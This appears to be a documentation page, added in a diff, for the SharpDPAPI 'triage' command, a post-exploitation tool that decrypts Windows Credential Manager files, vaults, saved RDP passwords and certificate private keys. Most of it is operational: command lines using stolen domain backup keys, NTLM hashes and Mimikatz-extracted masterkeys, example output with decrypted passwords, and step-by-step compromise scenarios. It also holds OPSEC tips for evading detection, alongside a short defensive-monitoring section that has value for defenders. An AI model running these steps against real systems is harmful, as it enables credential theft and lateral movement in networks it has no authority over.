@@ -1,0 +1,282 @@
+---
+title: 'triage'
+description: 'Run all user DPAPI extraction commands'
+icon: 'list-check'
+---
+
+## Overview
+
+The **triage** command is a comprehensive wrapper that executes all user DPAPI extraction commands in a single run. It automatically triages credentials, vaults, RDG files, and certificates for all accessible users on the system.
+
+<Tip>
+  This is the recommended starting point for user DPAPI triage. It runs the equivalent of `credentials`, `vaults`, `rdg`, and `certificates` commands.
+</Tip>
+
+## Basic Usage
+
+```bash
+# Triage with domain backup key
+SharpDPAPI.exe triage /pvk:key.pvk
+
+# Triage with user password
+SharpDPAPI.exe triage /password:Password123!
+
+# Triage with masterkey mappings
+SharpDPAPI.exe triage {GUID1}:SHA1 {GUID2}:SHA1
+
+# Remote system triage
+SharpDPAPI.exe triage /pvk:key.pvk /server:workstation.domain.com
+```
+
+## Command Arguments
+
+### Decryption Methods
+
+<Tabs>
+  <Tab title="Domain Backup Key">
+    ```bash
+    # Base64-encoded key
+    SharpDPAPI.exe triage /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+
+    # Key file
+    SharpDPAPI.exe triage /pvk:key.pvk
+    ```
+  </Tab>
+
+  <Tab title="User Credentials">
+    ```bash
+    # Plaintext password
+    SharpDPAPI.exe triage /password:Password123!
+
+    # NTLM hash
+    SharpDPAPI.exe triage /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+    # DPAPI credkey
+    SharpDPAPI.exe triage /credkey:abc123...
+    ```
+  </Tab>
+
+  <Tab title="Masterkey Mappings">
+    ```bash
+    # Inline masterkeys
+    SharpDPAPI.exe triage {GUID1}:SHA1 {GUID2}:SHA1
+
+    # Masterkey file
+    SharpDPAPI.exe triage /mkfile:masterkeys.txt
+    ```
+  </Tab>
+
+  <Tab title="RPC Decryption">
+    ```bash
+    # Decrypt via domain controller
+    SharpDPAPI.exe triage /rpc
+    ```
+  </Tab>
+</Tabs>
+
+### Targeting Options
+
+| Argument | Description |
+|----------|-------------|
+| `/server:SERVER` | Triage remote server (requires admin access and pvk/password) |
+
+<Note>
+  When using `/server`, you must also supply either `/pvk` or `/password` for decryption.
+</Note>
+
+## What Gets Triaged
+
+The triage command executes the following operations:
+
+<Steps>
+  <Step title="Credential Manager Credentials">
+    Searches `%LOCALAPPDATA%\Microsoft\Credentials\` for all users and decrypts credential files
+  </Step>
+
+  <Step title="Windows Vaults">
+    Searches `%LOCALAPPDATA%\Microsoft\Vault\` folders and decrypts vault data (browser passwords, etc.)
+  </Step>
+
+  <Step title="RDP Passwords">
+    Searches for RDCMan.settings and .rdg files containing saved RDP connection passwords
+  </Step>
+
+  <Step title="User Certificates">
+    Searches `%APPDATA%\Microsoft\Crypto\RSA\` for user certificate private keys
+  </Step>
+</Steps>
+
+## Execution Context
+
+<Tabs>
+  <Tab title="Elevated">
+    When run with administrative privileges:
+    - Triages **all users** on the system
+    - Accesses all user profile directories
+    - Maximum data collection
+  </Tab>
+
+  <Tab title="Unelevated">
+    When run without elevation:
+    - Only triages **current user**
+    - Limited to current user's profile
+    - More OPSEC-friendly
+  </Tab>
+</Tabs>
+
+## Example Output
+
+```
+[*] Action: User DPAPI Credential Triage
+
+[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+[*] User master key cache:
+
+{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
+{feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903a9b61c42e6c9ab0f4
+
+[*] Triaging Credentials for ALL users
+
+Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\
+
+  CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB
+    guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}
+    description      : Local Credential Data
+    LastWritten      : 1/22/2019 2:44:40 AM
+    TargetName       : Domain:target=TERMSRV/10.4.10.101
+    UserName         : DOMAIN\user
+    Credential       : Password!
+
+[*] Triaging Vaults for ALL users
+
+[*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+  Name               : Web Credentials
+    LastWritten      : 10/12/2018 12:10:42 PM
+    FriendlyName     : Internet Explorer
+    Identity         : admin
+    Resource         : https://10.0.0.1/
+    Authenticator    : Password!
+
+[*] Triaging RDCMan Settings Files for ALL users
+
+[*] Triaging User Certificates
+```
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Post-Domain Compromise">
+    After obtaining domain admin and retrieving the backup key:
+
+    ```bash
+    # 1. Get backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # 2. Triage local system
+    SharpDPAPI.exe triage /pvk:key.pvk
+
+    # 3. Triage multiple remote systems
+    SharpDPAPI.exe triage /pvk:key.pvk /server:ws01.domain.com
+    SharpDPAPI.exe triage /pvk:key.pvk /server:ws02.domain.com
+    SharpDPAPI.exe triage /pvk:key.pvk /server:dc.domain.com
+    ```
+  </Accordion>
+
+  <Accordion title="Local Admin Compromise">
+    Using Mimikatz-extracted masterkeys:
+
+    ```bash
+    # 1. Extract masterkeys with Mimikatz
+    # mimikatz# privilege::debug
+    # mimikatz# sekurlsa::dpapi
+
+    # 2. Run triage with extracted keys
+    SharpDPAPI.exe triage {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad...
+    ```
+  </Accordion>
+
+  <Accordion title="Known User Credentials">
+    When you have a specific user's credentials:
+
+    ```bash
+    # Using password
+    SharpDPAPI.exe triage /password:SecurePassword123
+
+    # Using NTLM hash
+    SharpDPAPI.exe triage /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Detection Considerations
+
+<Warning>
+  The triage command generates significant host activity that can be detected.
+</Warning>
+
+**Detection Indicators:**
+- Bulk access to multiple users' DPAPI directories
+- Reading of Credential Manager files
+- Access to Vault folders across user profiles
+- Enumeration of certificate stores
+- Potential LSASS access (if masterkeys are extracted)
+
+**Defensive Monitoring:**
+- Monitor bulk access to `%LOCALAPPDATA%\Microsoft\Credentials\`
+- Alert on access to `%LOCALAPPDATA%\Microsoft\Vault\`
+- Track certificate private key file access
+- Monitor for process accessing multiple user profiles
+- Detect non-standard processes reading DPAPI protected data
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="credentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/credentials">
+    Decrypt only Credential Manager credentials
+  </Card>
+  <Card title="vaults" icon="vault" href="/ghostpack-docs/SharpDPAPI-mdx/commands/vaults">
+    Decrypt only Windows Vault data
+  </Card>
+  <Card title="rdg" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/rdg">
+    Decrypt only RDP connection passwords
+  </Card>
+  <Card title="certificates" icon="certificate" href="/ghostpack-docs/SharpDPAPI-mdx/commands/certificates">
+    Decrypt only certificate private keys
+  </Card>
+  <Card title="machinetriage" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/machinetriage">
+    Triage machine/SYSTEM DPAPI data
+  </Card>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain DPAPI backup key
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Performance Optimization">
+  - Use `/mkfile` instead of inline masterkeys for better performance
+  - Target specific users when possible instead of triaging all users
+  - Use individual commands (credentials, vaults) if you only need specific data types
+</Accordion>
+
+<Accordion title="OPSEC Improvements">
+  - Run without elevation to only triage current user (less noisy)
+  - Use `/unprotect` for RDG files when possible (no masterkeys needed)
+  - Target specific remote systems instead of broad sweeps
+  - Redirect output to file with `/consoleoutfile` to minimize artifacts
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **No data decrypted:**
+  - Verify decryption method is correct (pvk, password, masterkeys)
+  - Check if DPAPI data actually exists for target users
+  - Ensure proper permissions to read user profile directories
+
+  **Access denied errors:**
+  - Elevate to Administrator for multi-user triage
+  - Verify remote admin access for `/server` operations
+  - Check if target files are locked or in use
+</Accordion>
